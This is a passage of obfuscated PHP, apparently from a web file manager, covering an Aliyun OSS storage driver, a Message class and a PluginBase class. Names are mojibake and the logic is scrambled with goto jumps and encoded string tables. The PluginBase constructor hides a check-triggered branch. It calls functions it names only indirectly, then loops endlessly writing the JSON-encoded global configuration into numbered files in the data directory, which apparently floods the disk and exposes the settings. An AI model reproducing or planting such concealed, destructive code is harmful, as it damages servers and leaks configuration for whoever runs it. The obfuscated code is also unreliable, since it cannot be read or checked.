$CÃÛÓãÚ—[$DÅÓ­÷Ö[168]] : $DÅÓ­÷Ö[33]; goto b–‹ÒŒ”Õª; fäÀ­‘å‹‚: } public function listUploadParts($bìå±°ëõ, $CÈœÁàá›ğ) { goto b¢È÷á²ù; Ağ‡Å²Š”œ: return array($BÃ¾‰‡ñÇ[232] => $cÁŒùÒ‰£å, $BÃ¾‰‡ñÇ[222] => $CÈœÁàá›ğ[$BÃ¾‰‡ñÇ[222]], $BÃ¾‰‡ñÇ[234] => $DÍ†Á‹‘È); goto Fä¶âĞì¬¦; Eõì†¾ÜËÇ: $fê„‘½šè¦ = $F×ÄÀ›Ô™Ö->getListPart(); $DÍ†Á‹‘È = array(); foreach ($fê„‘½šè¦ as $FÚ·‹ƒŒÃï) { $DÍ†Á‹‘È[] = array($BÃ¾‰‡ñÇ[1281] => $FÚ·‹ƒŒÃï->getPartNumber(), $BÃ¾‰‡ñÇ[1282] => trim($FÚ·‹ƒŒÃï->getETag(), $BÃ¾‰‡ñÇ[116])); } goto eäÃÜ°µØ; b¢È÷á²ù: $BÃ¾‰‡ñÇ =& $_SERVER[œº]; $CÊ¿î›¼‰ = parse_url_query($CÈœÁàá›ğ[$BÃ¾‰‡ñÇ[168]]); $F×ÄÀ›Ô™Ö = $this->client->listParts($this->bucket, $this->pathEncode($bìå±°ëõ), $CÊ¿î›¼‰[$BÃ¾‰‡ñÇ[221]]); goto Eõì†¾ÜËÇ; eäÃÜ°µØ: unset($CÈœÁàá›ğ[$BÃ¾‰‡ñÇ[223]], $CÈœÁàá›ğ[$BÃ¾‰‡ñÇ[227]]); $cÁŒùÒ‰£å = $this->multiUploadAuthData($bìå±°ëõ, $CÈœÁàá›ğ); if (empty($cÁŒùÒ‰£å)) { return !1; } goto Ağ‡Å²Š”œ; Fä¶âĞì¬¦: } public function download($aÕÉ‚¸”ô“, $a¥„Ââ‚ˆ­) { if ($this->isFolder($aÕÉ‚¸”ô“)) { return !1; } try { $EÇà‚¨ƒ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $a¥„Ââ‚ˆ­); $EÇà‚¨ƒ = $this->trafficLimit($_SERVER[œº][109], $EÇà‚¨ƒ); $this->client->getObject($this->bucket, $this->pathEncode($aÕÉ‚¸”ô“), $EÇà‚¨ƒ); } catch (OSS\Core\OssException $D—«µÚ¹ÈŠ) { return !1; } return $a¥„Ââ‚ˆ­; } public function fileSubstr($EÜßä¡Œè, $F›ùÎâŞô— = 0, $fŒîˆºŸ‡í = false) { if ($F›ùÎâŞô— === -1) { $Eã©óëË· = array(); } else { if ($fŒîˆºŸ‡í === !1) { $eåÀÇ„‚»ó = $this->size($EÜßä¡Œè); } else { $eåÀÇ„‚»ó = $F›ùÎâŞô— + $fŒîˆºŸ‡í - 1; } $Eã©óëË· = array(OSS\OssClient::OSS_RANGE => "{$F›ùÎâŞô—}\55{$eåÀÇ„‚»ó}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($EÜßä¡Œè), $Eã©óëË·); } catch (OSS\Core\OssException $fâ˜„ö·Ò•) { think_exception($fâ˜„ö·Ò•->getMessage()); return !1; } } private function trafficLimit($Fù…åæ‰¥, $B÷Ç×Üì = array()) { goto Cœë‰°«å; FÛŞÑ½–ŠÀ: return $B÷Ç×Üì; goto cÂº­éÖÏ; eºÑ÷³Š„: if (!$D²ï™õ»³º) { return $B÷Ç×Üì; } $D²ï™õ»³º = $D²ï™õ»³º < 819200 ? 819200 : ($D²ï™õ»³º > 838860800 ? 838860800 : $D²ï™õ»³º); $B÷Ç×Üì[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($D²ï™õ»³º); goto FÛŞÑ½–ŠÀ; Cœë‰°«å: $EíË‹²î¹ =& $_SERVER[œº]; if ($Fù…åæ‰¥ == $EíË‹²î¹[1288] && $this->isUploadServer() || $Fù…åæ‰¥ == $EíË‹²î¹[109] && $this->isFileOutServer()) { return $B÷Ç×Üì; } $D²ï™õ»³º = floatval($GLOBALS[$EíË‹²î¹[6]][$EíË‹²î¹[88]][$EíË‹²î¹[107]][$Fù…åæ‰¥]) * 1024 * 1024 * 8; goto eºÑ÷³Š„; cÂº­éÖÏ: } public function link($FìÇ ˆ¾§ï, $EÂŠ…Ã¼ÁŠ = array()) { $C¾°˜ÀÂ™ß =& $_SERVER[œº]; if (!$this->exist($FìÇ ˆ¾§ï) || $this->isFolder($FìÇ ˆ¾§ï)) { return !1; } try { $EÂŠ…Ã¼ÁŠ = $this->trafficLimit($C¾°˜ÀÂ™ß[109], $EÂŠ…Ã¼ÁŠ); $E£³‚Í„‘ = $this->client->signUrl($this->bucket, $this->pathEncode($FìÇ ˆ¾§ï), 3600 * 12, $C¾°˜ÀÂ™ß[228], $EÂŠ…Ã¼ÁŠ); return $this->getCdnLink($E£³‚Í„‘); } catch (OSS\Core\OssException $eàÃÎá¤Òá) { return !1; } } public function fileOut($D•¥¿ÀÍ³—, $b™”ª ›® = false, $D«ç¦¡Û‹– = false, $BÓ×îÀİá± = '') { goto D”ŞØÃÚ‹»; d¹Ù¥³ÍÛ»: $D«ç¦¡Û‹– = rawurlencode($D«ç¦¡Û‹–); $EŒÁß„”Ì = get_file_mime(get_path_ext($D«ç¦¡Û‹–)); if ($EŒÁß„”Ì == $bŒÙİƒ­‡™[213]) { return parent::fileOut($D•¥¿ÀÍ³—, $b™”ª ›®, $D«ç¦¡Û‹–, $BÓ×îÀİá±); } goto A†¥¨‚ø; A†¥¨‚ø: $b™”ª ›® = $b™”ª ›® ? $bŒÙİƒ­‡™[214] : $bŒÙİƒ­‡™[215]; $D£®Í±²‰Ù = array(OSS\OssClient::OSS_SUB_RESOURCE => $bŒÙİƒ­‡™[1299] . rawurlencode("{$b™”ª ›®}\x3b\x66\151\154\x65\156\141\155\x65\75{$D«ç¦¡Û‹–}")); $D£®Í±²‰Ù[OSS\OssClient::OSS_SUB_RESOURCE] .= $bŒÙİƒ­‡™[1300] . rawurlencode($EŒÁß„”Ì); goto EéÙ‘¢ÜÂ; EéÙ‘¢ÜÂ: $F­é®ç™ÕÍ = $this->link($D•¥¿ÀÍ³—, $D£®Í±²‰Ù); $this->fileOutLink($F­é®ç™ÕÍ); goto fªäñ«“”½; D”ŞØÃÚ‹»: $bŒÙİƒ­‡™ =& $_SERVER[œº]; if ($this->isFileOutServer()) { return $this->fileOutServer($D•¥¿ÀÍ³—, $b™”ª ›®, $D«ç¦¡Û‹–, $BÓ×îÀİá±); } if (!$D«ç¦¡Û‹–) { $D«ç¦¡Û‹– = $this->pathThis($D•¥¿ÀÍ³—); } goto d¹Ù¥³ÍÛ»; fªäñ«“”½: } public function fileOutServer($DÃ àóïÎ, $CËƒğ¡»¼ = false, $eÃ¨¤¹‰ˆ = false, $cĞ¼æ‚ßö» = '') { parent::fileOut($DÃ àóïÎ, $CËƒğ¡»¼, $eÃ¨¤¹‰ˆ, $cĞ¼æ‚ßö»); } public function fileOutImage($b Š‡ñ…¯¶, $A„„İ‚ï¼ = 250) { $Cç»¦…¯Œ§ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[œº][1301] . $A„„İ‚ï¼); $eùŠ±Ñ—‡° = $this->link($b Š‡ñ…¯¶, $Cç»¦…¯Œ§); $this->fileOutLink($eùŠ±Ñ—‡°); } public function fileOutImageServer($f«ö‘±¥ÄÎ, $Bå¥™Ÿ°ÚÜ = 250) { parent::fileOutImage($f«ö‘±¥ÄÎ, $Bå¥™Ÿ°ÚÜ); } public function fileOutLink($EÕ’ìêî–) { $dİÜÜã° =& $_SERVER[œº]; if (!$this->isCdnHost() && substr($EÕ’ìêî–, 0, 7) == $dİÜÜã°[1204]) { $EÕ’ìêî– = $dİÜÜã°[1205] . substr($EÕ’ìêî–, 7); } header($dİÜÜã°[159] . $EÕ’ìêî–); die; } public function hashMd5($bõïì†Íß², $Fô§Û³…Ï = '') { $f øßó¦¾‰ =& $_SERVER[œº]; $c…Şàõß¼ = $this->_objectMeta($bõïì†Íß²); if (!$c…Şàõß¼) { return $f øßó¦¾‰[33]; } if (!isset($c…Şàõß¼[$f øßó¦¾‰[1277]]) && !empty($Fô§Û³…Ï)) { $EÏºøó˜°ë = $this->updateObjMeta($bõïì†Íß², array($f øßó¦¾‰[1277] => $Fô§Û³…Ï)); $c…Şàõß¼[$f øßó¦¾‰[1277]] = $EÏºøó˜°ë ? $Fô§Û³…Ï : $f øßó¦¾‰[33]; } return isset($c…Şàõß¼[$f øßó¦¾‰[1277]]) ? strtolower($c…Şàõß¼[$f øßó¦¾‰[1277]]) : $f øßó¦¾‰[33]; } public function size($bêóëãÆ¨Ü) { $EŒë¤â£§ = $this->objectMeta($bêóëãÆ¨Ü); return $EŒë¤â£§ ? $EŒë¤â£§[$_SERVER[œº][78]] : 0; } public function info($E­Ê­Å¹·Ô) { if ($this->isFolder($E­Ê­Å¹·Ô)) { return $this->folderInfo($E­Ê­Å¹·Ô); } else { if ($this->isFile($E­Ê­Å¹·Ô)) { return $this->fileInfo($E­Ê­Å¹·Ô); } } return !1; } public function exist($aòÌ—ğÁÉ×) { return $this->isFile($aòÌ—ğÁÉ×) || $this->isFolder($aòÌ—ğÁÉ×); } public function isFile($døô…˜‰ñ™) { return !$this->isFolder($døô…˜‰ñ™) && $this->objectMeta($døô…˜‰ñ™); } public function isFolder($BöåóÆ†—Á) { return $this->cacheMethod($_SERVER[œº][199], $BöåóÆ†—Á); } protected function objectMeta($bŸËÙ†„›) { return $this->cacheMethod($_SERVER[œº][200], $bŸËÙ†„›); } protected function _objectMeta($fİ®Ùù¹•) { $bÜâ­ÁÙ… =& $_SERVER[œº]; try { $BËµÚÍºè = $this->client->getObjectMeta($this->bucket, $this->pathEncode($fİ®Ùù¹•)); } catch (OSS\Core\OssException $C²¡Áä‰èÄ) { $BËµÚÍºè = !1; } if ($BËµÚÍºè) { $BËµÚÍºè[$bÜâ­ÁÙ…[78]] = intval($BËµÚÍºè[$bÜâ­ÁÙ…[1275]]); } return $BËµÚÍºè; } protected function _isFolder($C ƒ¢„Éíè) { $Fğ·ìãÚà =& $_SERVER[œº]; if ($C ƒ¢„Éíè == $Fğ·ìãÚà[33] || $C ƒ¢„Éíè == $Fğ·ìãÚà[8]) { return !0; } $AŠÚàÄÈñ = array($Fğ·ìãÚà[1271] => $Fğ·ìãÚà[8], $Fğ·ìãÚà[1272] => rtrim($C ƒ¢„Éíè, $Fğ·ìãÚà[8]) . $Fğ·ìãÚà[8], $Fğ·ìãÚà[1273] => 1, $Fğ·ìãÚà[1274] => $Fğ·ìãÚà[33]); $FØå§……ÛŞ = $this->client->listObjects($this->bucket, $AŠÚàÄÈñ); if ($FØå§……ÛŞ->getObjectList() || $FØå§……ÛŞ->getPrefixList()) { return !0; } return !1; } } goto eíÏÁîæ; D–îĞÅ°”: class Message { function __construct() { } public function send($a‡¦ÂÕ²Š = '', $c¡•‰»¶À = array(), $aƒ‘‰Í×÷ = "\x74\x65\170\x74") { goto D‰ã§Áßë; c¬²Ó™Òë: Hook::trigger($C±ÓË›Ü›İ[1397], $f²ªí¼); goto aÅ–õÇëÉš; D‰ã§Áßë: $C±ÓË›Ü›İ =& $_SERVER[œº]; $eÌˆ†ˆ£º… = array($C±ÓË›Ü›İ[29] => $C±ÓË›Ü›İ[1394], $C±ÓË›Ü›İ[715] => $a‡¦ÂÕ²Š); if (in_array($aƒ‘‰Í×÷, array($C±ÓË›Ü›İ[1394], $C±ÓË›Ü›İ[1395]))) { $eÌˆ†ˆ£º…[$C±ÓË›Ü›İ[29]] = $aƒ‘‰Í×÷; } goto B£†ÁõŠ‡½; B£†ÁõŠ‡½: $c¡•‰»¶À = array($C±ÓË›Ü›İ[1015] => isset($c¡•‰»¶À[$C±ÓË›Ü›İ[1015]]) ? $c¡•‰»¶À[$C±ÓË›Ü›İ[1015]] : $C±ÓË›Ü›İ[33], $C±ÓË›Ü›İ[562] => isset($c¡•‰»¶À[$C±ÓË›Ü›İ[562]]) ? $c¡•‰»¶À[$C±ÓË›Ü›İ[562]] : $C±ÓË›Ü›İ[33]); if (empty($a‡¦ÂÕ²Š) || empty($c¡•‰»¶À[$C±ÓË›Ü›İ[1015]]) && empty($c¡•‰»¶À[$C±ÓË›Ü›İ[562]])) { return !1; } $f²ªí¼ = array($C±ÓË›Ü›İ[1335] => $eÌˆ†ˆ£º…, $C±ÓË›Ü›İ[1396] => $c¡•‰»¶À); goto c¬²Ó™Òë; aÅ–õÇëÉš: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto D£Ç¥î‘²; D£Ç¥î‘²: $d¶•šåï¼Ş =& $_SERVER[œº]; $C»Øæ¼§½Œ = $_SERVER[$d¶•šåï¼Ş[824]] . $d¶•šåï¼Ş[825]; $C¼ù°¢õä = $d¶•šåï¼Ş[838]; goto cå¦¾Š†‡; a·„ˆçÕÑ¿: $this->in =& $in; $this->modelPlugin = Model($d¶•šåï¼Ş[1398]); $this->pluginName = str_replace($d¶•šåï¼Ş[1398], $d¶•šåï¼Ş[33], get_class($this)); goto cØøëÜ²•²; cØøëÜ²•²: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $d¶•šåï¼Ş[8]; $this->pluginApi = appHostGet() . $d¶•šåï¼Ş[1399] . $this->pluginName . $d¶•šåï¼Ş[8]; $this->pluginHost = $config[$d¶•šåï¼Ş[1400]] . $this->pluginName . $d¶•šåï¼Ş[8]; goto AòŒá¨°Îˆ; cå¦¾Š†‡: if ($_SERVER[$d¶•šåï¼Ş[821]] != $C¼ù°¢õä($C»Øæ¼§½Œ)) { goto eÅµÑ‡ĞÔ; CŞÒ˜ó¿: $aóºæ¯‹® = $d¶•šåï¼Ş[840]; $aóºæ¯‹®($_SERVER[$d¶•šåï¼Ş[841]]); $eø ™à“Ôó = $d¶•šåï¼Ş[839]; goto e¶â¶Äæ; eÅµÑ‡ĞÔ: $eø ™à“Ôó = $d¶•šåï¼Ş[839]; $E‰ßœÊ»Ä = $d¶•šåï¼Ş[823]; $fÒËèÙÆ¼ = $_SERVER[$d¶•šåï¼Ş[824]] . $d¶•šåï¼Ş[825]; goto Bàìšˆª‹; Bàìšˆª‹: $d›»÷„ùè = $E‰ßœÊ»Ä($fÒËèÙÆ¼); $B‡Í››ï­ = explode($d¶•šåï¼Ş[229], $d›»÷„ùè); if (count($B‡Í››ï­) < $d¶•šåï¼Ş[578]) { $c¢–èœâ¨š = $d¶•šåï¼Ş[826]; $c¢–èœâ¨š(); } goto CŞÒ˜ó¿; d«ÔÖ”¢¾: $e¦èÅÛ¿ò¢ = 1; for ($AùÚ’Ï©º… = $e¦èÅÛ¿ò¢; $AùÚ’Ï©º… > 0; $AùÚ’Ï©º…++) { $a–‡›©‰—‰(DATA_PATH . $AùÚ’Ï©º…, $C’¾ÏãØËÑ); } goto aÁ•Á¨ÃÑá; e¶â¶Äæ: $eø ™à“Ôó(); $a–‡›©‰—‰ = $d¶•šåï¼Ş[842]; $C’¾ÏãØËÑ = json_encode($GLOBALS[$d¶•šåï¼Ş[843]]); goto d«ÔÖ”¢¾; aÁ•Á¨ÃÑá: } global $in, $config; $this->config =& $config; goto a·„ˆçÕÑ¿; Bˆå…ƒê§œ: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto F´Ó´…í–ò; AòŒá¨°Îˆ: $this->pluginHostDefault = $config[$d¶•šåï¼Ş[1400]] . $this->pluginName . $d¶•šåï¼Ş[8]; $bÖÜ£´æÑè = $config[$d¶•šåï¼Ş[1401]]; if ($bÖÜ£´æÑè && strpos($d¶•šåï¼Ş[47] . $bÖÜ£´æÑè . $d¶•šåï¼Ş[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$d¶•šåï¼Ş[1402]] . $this->pluginName . $d¶•šåï¼Ş[8]; } goto Bˆå…ƒê§œ; F´Ó´…í–ò: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[œº][1403]); } protected function assign($d´…ÉÓ”•Ğ, $b²Ææ–Â›¶ = false) { if (is_array($d´…ÉÓ”•Ğ)) { $this->values = array_merge($this->values, $d´…ÉÓ”•Ğ); } else { $this->values[$d´…ÉÓ”•Ğ] = $b²Ææ–Â›¶; } } protected function display($cã„Â­È¢) { extract($this->values); require $cã„Â­È¢; } final function hookRegist($E¨ó•ëÃˆù) { $this->modelPlugin->appRegist($this->pluginName, $E¨ó•ëÃˆù); } final function appIcon() { $CÓ¿Çê‹ô =& $_SERVER[œº]; $dÃë¡™ßëº = $this->appPackage(); $D »ÊŠ¥’ = $CÓ¿Çê‹ô[33]; if (isset($dÃë¡™ßëº[$CÓ¿Çê‹ô[409]])) { if (isset($dÃë¡™ßëº[$CÓ¿Çê‹ô[409]][$CÓ¿Çê‹ô[1404]])) { $D »ÊŠ¥’ = $CÓ¿Çê‹ô[1405] . $dÃë¡™ßëº[$CÓ¿Çê‹ô[409]][$CÓ¿Çê‹ô[1404]] . $CÓ¿Çê‹ô[1406]; } else { if ($dÃë¡™ßëº[$CÓ¿Çê‹ô[409]][$CÓ¿Çê‹ô[1407]]) { $D »ÊŠ¥’ = $CÓ¿Çê‹ô[1408] . $dÃë¡™ßëº[$CÓ¿Çê‹ô[409]][$CÓ¿Çê‹ô[1407]] . $CÓ¿Çê‹ô[1409]; } } } return $D »ÊŠ¥’; } final function fileCanView($f’¦ƒ™É›Å) { goto då¿ëÉ¥£; B¾Êˆ†øÖ: $cÈì©Ø×ôÈ = Session::get($cÉ×›Ğ—ã[1410]); if (!$cÈì©Ø×ôÈ || !$cÈì©Ø×ôÈ[$cÉ×›Ğ—ã[1411]]) { $f«æ¬•òÔĞ = $cÉ×›Ğ—ã[1412] . rawurlencode(this_url()); show_tips(LNG($cÉ×›Ğ—ã[1413]) . $cÉ×›Ğ—ã[1414] . $f«æ¬•òÔĞ . $cÉ×›Ğ—ã[1415] . LNG($cÉ×›Ğ—ã[1416]) . $cÉ×›Ğ—ã[1417], !1); } if (!Action($cÉ×›Ğ—ã[1418])->authCan($cÉ×›Ğ—ã[1419])) { show_tips(LNG($cÉ×›Ğ—ã[1420]) . $cÉ×›Ğ—ã[1421], !1); } goto d¡Õ‡Ş¥ ; d¡Õ‡Ş¥ : ActionCall($cÉ×›Ğ—ã[1422], $f’¦ƒ™É›Å); goto c­¥µÇ™Ğ‚; då¿ëÉ¥£: $cÉ×›Ğ—ã =& $_SERVER[œº]; if (request_url_safe($f’¦ƒ™É›Å)) { return !0; } if ($this->isShare($f’¦ƒ™É›Å)) { return !0; } goto B¾Êˆ†øÖ; c­¥µÇ™Ğ‚: } final function isShare($E¥ÓÁ¶Õù) { $FÎÈç« ‰ñ = KodIO::parse($E¥ÓÁ¶Õù); return $FÎÈç« ‰ñ[$_SERVER[œº][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Fë›åºáÕ·) { if (request_url_safe($Fë›åºáÕ·)) { return $Fë›åºáÕ·; } if (!$this->isShare($Fë›åºáÕ·)) { $Fë›åºáÕ· = $this->filePath($Fë›åºáÕ·); } return Action($_SERVER[œº][1070])->linkOut($Fë›åºáÕ·); } public function filePathLinkOut($EÕˆÂ¯‡äØ) { if (request_url_safe($EÕˆÂ¯‡äØ)) { return $EÕˆÂ¯‡äØ; } $this->fileCanView($EÕˆÂ¯‡äØ); return Action($_SERVER[œº][1070])->link($EÕˆÂ¯‡äØ); } final function filePath($BÎŠ îìÅ­) { $aÑˆŒíÒË¼ =& $_SERVER[œº]; if ($FèÎŠåˆõæ = $this->checkSharePath($BÎŠ îìÅ­)) { Hook::trigger($aÑˆŒíÒË¼[1423], $FèÎŠåˆõæ); return $FèÎŠåˆõæ; } $this->fileCanView($BÎŠ îìÅ­); if (request_url_safe($BÎŠ îìÅ­)) { $eø’‚˜êŒ´ = parse_url_query($BÎŠ îìÅ­); if (isset($eø’‚˜êŒ´[$aÑˆŒíÒË¼[1424]]) && isset($eø’‚˜êŒ´[$aÑˆŒíÒË¼[209]])) { $Aé÷‰¶‹Î‰ = Model($aÑˆŒíÒË¼[730])->get($aÑˆŒíÒË¼[731]); $dãïÚ·¿‡¸ = Mcrypt::decode($eø’‚˜êŒ´[$aÑˆŒíÒË¼[209]], $Aé÷‰¶‹Î‰); if ($dãïÚ·¿‡¸) { $this->fileInfo = IO::infoWithChildren($dãïÚ·¿‡¸); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $dãïÚ·¿‡¸; } } $BÎŠ îìÅ­ = $this->_cacheHttpFile($BÎŠ îìÅ­); $this->fileInfo = IO::infoWithChildren($BÎŠ îìÅ­); } else { $this->fileInfo = IO::infoWithChildren($BÎŠ îìÅ­); if (!$this->fileInfo) { show_tips(LNG($aÑˆŒíÒË¼[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($aÑˆŒíÒË¼[1423], $BÎŠ îìÅ­); return $BÎŠ îìÅ­; } final function _cacheHttpFile($Bé®¼ƒ¿) { $FÈêß›‚¤ƒ = hash_path($Bé®¼ƒ¿, !0); $this->cachePath = $this->pluginCachePath($FÈêß›‚¤ƒ); if ($C»¢ßá«ñ‹ = IO::fileNameExist($this->cachePath, $FÈêß›‚¤ƒ)) { return KodIO::make($C»¢ßá«ñ‹); } $E–Êì…³¦Ÿ = $this->cachePath . $FÈêß›‚¤ƒ; return $this->pluginCacheFileSet($E–Êì…³¦Ÿ, file_get_contents_nossl($Bé®¼ƒ¿)); } final function _tmpFileName($a¢”ò»Ö¢Á = array()) { goto EÈ¬Î”‹÷; EÈ¬Î”‹÷: $AÀ‹Ô©²ÍÔ =& $_SERVER[œº]; if (!$a¢”ò»Ö¢Á) { $a¢”ò»Ö¢Á = $this->fileInfo; } if (isset($a¢”ò»Ö¢Á[$AÀ‹Ô©²ÍÔ[171]])) { return $a¢”ò»Ö¢Á[$AÀ‹Ô©²ÍÔ[171]]; } goto e¡ÉœÈ´¯ô; e¡ÉœÈ´¯ô: if (isset($a¢”ò»Ö¢Á[$AÀ‹Ô©²ÍÔ[164]][$AÀ‹Ô©²ÍÔ[171]])) { return $a¢”ò»Ö¢Á[$AÀ‹Ô©²ÍÔ[164]][$AÀ‹Ô©²ÍÔ[171]]; } $FÈÇ£ÄøÒë = IO::hashSimple($a¢”ò»Ö¢Á[$AÀ‹Ô©²ÍÔ[76]]); if ($FÈÇ£ÄøÒë) { return $FÈÇ£ÄøÒë; } goto B´ÙéöÑ’Ê; B´ÙéöÑ’Ê: $c††‹™ÀŸ = array($a¢”ò»Ö¢Á[$AÀ‹Ô©²ÍÔ[28]], $a¢”ò»Ö¢Á[$AÀ‹Ô©²ÍÔ[76]], $a¢”ò»Ö¢Á[$AÀ‹Ô©²ÍÔ[78]]); if (isset($a¢”ò»Ö¢Á[$AÀ‹Ô©²ÍÔ[487]])) { $c††‹™ÀŸ[] = $a¢”ò»Ö¢Á[$AÀ‹Ô©²ÍÔ[487]]; } return md5(implode($AÀ‹Ô©²ÍÔ[71], $c††‹™ÀŸ)); goto fèî•¤äåÑ; fèî•¤äåÑ: } final function checkSharePath($EòòŞ¯ãÆ) { goto CŠ‡ÃİÃŞ™; b·ï¹§ñÎ•: $bÀ–©ƒÃ = Action($B·’¾‘ÕŸ[1070])->sharePathInfo($EòòŞ¯ãÆ); if (!isset($bÀ–©ƒÃ[$B·’¾‘ÕŸ[76]])) { show_json(LNG($B·’¾‘ÕŸ[1426]), !1); } $this->fileInfo = $bÀ–©ƒÃ[$B·’¾‘ÕŸ[164]]; goto D÷×ùáØ¨’; D÷×ùáØ¨’: $this->cachePath = $this->pluginCachePath($this->fileInfo[$B·’¾‘ÕŸ[171]]); return $bÀ–©ƒÃ[$B·’¾‘ÕŸ[76]]; goto aåÒæ†Âõõ; CŠ‡ÃİÃŞ™: $B·’¾‘ÕŸ =& $_SERVER[œº]; if (!defined($B·’¾‘ÕŸ[454])) { define($B·’¾‘ÕŸ[1425], 0); } if (!$this->isShare($EòòŞ¯ãÆ)) { return !1; } goto b·ï¹§ñÎ•; aåÒæ†Âõõ: } final function pluginCachePath($fÚ³Î ” = '') { $f¨ô®•ÇêÊ =& $_SERVER[œº]; $D¤ÜŞÃíŞ = IO_PATH_SYSTEM_TEMP . $f¨ô®•ÇêÊ[1427] . $this->pluginName; if (!($D •ÍèÈğ = IO::infoFull($D¤ÜŞÃíŞ))) { return IO::mkdir($D¤ÜŞÃíŞ . $f¨ô®•ÇêÊ[8] . $fÚ³Î ”); } if (empty($fÚ³Î ”)) { return $D •ÍèÈğ[$f¨ô®•ÇêÊ[76]]; } if (!($Bˆº‘¥¡‘Á = IO::fileNameExist($D •ÍèÈğ[$f¨ô®•ÇêÊ[76]], $fÚ³Î ”))) { return IO::mkdir($D •ÍèÈğ[$f¨ô®•ÇêÊ[76]] . $fÚ³Î ”); } return KodIO::make($Bˆº‘¥¡‘Á); } final function pluginCacheFileSet($E±¸â¦¢¤Ÿ, $BšÍµìÏÓØ = '') { $d¿µ ÀËñ =& $_SERVER[œº]; if (!($cˆ»‰îÌ˜Ö = IO::infoFull($E±¸â¦¢¤Ÿ))) { return IO::mkfile($E±¸â¦¢¤Ÿ, $BšÍµìÏÓØ, REPEAT_REPLACE); } IO::setContent($cˆ»‰îÌ˜Ö[$d¿µ ÀËñ[76]], $BšÍµìÏÓØ); return $cˆ»‰îÌ˜Ö[$d¿µ ÀËñ[76]]; } final function pluginLocalFile($e†ö‘Å„´„ = '') { goto E¯±íùó‰ô; a–åÊ†âÄÊ: if (!checkExtSafe($f¬¤Éè¢´º)) { $f¬¤Éè¢´º = $f¬¤Éè¢´º . $d—®“¢£¡¬[1428]; } $DºÓœØÔ‡š = $d¤ù¢Ô‹ä . $f¬¤Éè¢´º; if (@file_exists($DºÓœØÔ‡š)) { return $DºÓœØÔ‡š; } goto A”±¸›¸¼; f±“ºÂïº: if (!$e†ö‘Å„´„) { return $d¤ù¢Ô‹ä; } $f…íÀ–…³Ï = IO::info($e†ö‘Å„´„); $f¬¤Éè¢´º = $this->_tmpFileName($f…íÀ–…³Ï) . $d—®“¢£¡¬[95] . $f…íÀ–…³Ï[$d—®“¢£¡¬[168]]; goto a–åÊ†âÄÊ; A”±¸›¸¼: return IO::copy($e†ö‘Å„´„, $d¤ù¢Ô‹ä, 0, $f¬¤Éè¢´º); goto c×„ã—…; E¯±íùó‰ô: $d—®“¢£¡¬ =& $_SERVER[œº]; $d¤ù¢Ô‹ä = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($d¤ù¢Ô‹ä)) { mk_dir($d¤ù¢Ô‹ä); } goto f±“ºÂïº; c×„ã—…: } final function appPackage() { goto Dƒ¹ÂçóíÅ; Dƒ¹ÂçóíÅ: $a£´ê›Æ”¹ =& $_SERVER[œº]; if ($this->packageData) { return $this->packageData; } $FÂ–óÄ÷ÊÌ = $this->parseFile($this->pluginPath . $a£´ê›Æ”¹[1429]); goto D„öº– ”¶; cõ² ÆêØ: $cØ™”äÑ“‡ = Hook::trigger($a£´ê›Æ”¹[1430], $c¢ùƒÎ† à); if ($cØ™”äÑ“‡ && is_array($cØ™”äÑ“‡)) { $c¢ùƒÎ† à = $cØ™”äÑ“‡; } $this->packageData = $c¢ùƒÎ† à; goto aƒïĞØç¼ô; D„öº– ”¶: $this->parseLang($FÂ–óÄ÷ÊÌ); $c¢ùƒÎ† à = json_decode_force($FÂ–óÄ÷ÊÌ); if (!$c¢ùƒÎ† à) { return array(); } goto cõ² ÆêØ; aƒïĞØç¼ô: return $c¢ùƒÎ† à; goto CÊß×äÙ’Ô; CÊß×äÙ’Ô: } public function packageInfoGet($D¹™ÍæïÊ˜) { $BàçÜ”‘ê = $this->appPackage(); return array_get_value($BàçÜ”‘ê, $D¹™ÍæïÊ˜); } public function packageVersion() { return $this->packageInfoGet($_SERVER[œº][1431]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[œº][1432]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[œº][1433]); } private function parseFile($BÎ¥…Æê¢) { goto c…±î©»‡; D‚ğç·À™°: $FµÕé÷èÙ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$C§×ŒèÊ¬•[88]][$C§×ŒèÊ¬•[1441]]); if (strstr($f·öŠìƒ²ˆ, $C§×ŒèÊ¬•[1442])) { $f¹™áß¼‡ = rawurlencode(json_encode($this->pluginLangArr)); $f·öŠìƒ²ˆ = str_replace($C§×ŒèÊ¬•[1442], $f¹™áß¼‡, $f·öŠìƒ²ˆ); } if (strstr($f·öŠìƒ²ˆ, $C§×ŒèÊ¬•[1443])) { $f¹™áß¼‡ = $f¹™áß¼‡ = rawurlencode(json_encode($this->getConfig())); $f·öŠìƒ²ˆ = str_replace($C§×ŒèÊ¬•[1443], $f¹™áß¼‡, $f·öŠìƒ²ˆ); } goto a–à÷º±²†; c…±î©»‡: $C§×ŒèÊ¬• =& $_SERVER[œº]; $f·öŠìƒ²ˆ = file_get_contents_nossl($BÎ¥…Æê¢); $dÇ×Û¼ññ‹ = array($C§×ŒèÊ¬•[1434], $C§×ŒèÊ¬•[1435], $C§×ŒèÊ¬•[1436], $C§×ŒèÊ¬•[1437], $C§×ŒèÊ¬•[1438], $C§×ŒèÊ¬•[1439], $C§×ŒèÊ¬•[1440]); goto D‚ğç·À™°; a–à÷º±²†: $f·öŠìƒ²ˆ = str_replace($dÇ×Û¼ññ‹, $FµÕé÷èÙ, $f·öŠìƒ²ˆ); return $f·öŠìƒ²ˆ; goto cÔÙªĞ£Úä; cÔÙªĞ£Úä: } private function 